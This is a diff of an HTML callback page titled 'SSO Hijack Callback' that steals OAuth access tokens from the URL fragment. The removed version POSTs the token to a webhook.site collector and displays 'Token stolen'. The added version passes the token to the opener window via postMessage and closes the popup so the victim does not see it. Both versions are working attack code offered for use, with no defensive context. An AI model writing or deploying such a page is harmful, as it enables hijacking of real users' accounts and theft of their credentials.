@@ -1,24 +1,27 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>Got Token</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>SSO Hijack Callback</title>
+</head>
 <body>
-  <p>Sending token to attacker…</p>
+  <p>Processing…</p>
   <script>
-    // Extract access_token from URL fragment
+    // 1) Pull the access_token out of the URL fragment
     const params = new URLSearchParams(location.hash.slice(1));
-    const token = params.get('access_token');
+    const token  = params.get('access_token');
     if (!token) {
-      document.body.textContent = 'No token found.';
+      document.body.textContent = '⚠️ No token found.';
     } else {
-      // 1) POST it to your collector
-      fetch('https://webhook.site/340bffcf-cf72-4d76-81b7-1ed01af77c42/collect', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({access_token: token})
-      });
-      // 2) Show it on screen
-      document.body.innerHTML = '<pre>Token stolen:\n' + token + '</pre>';
+      // 2) Send it back to the opener (parent) via postMessage
+      window.opener.postMessage(
+        { type: 'got_token', token },
+        window.origin
+      );
+      // 3) Close the popup so the victim never sees your callback page
+      window.close();
     }
   </script>
 </body>
 </html>
+
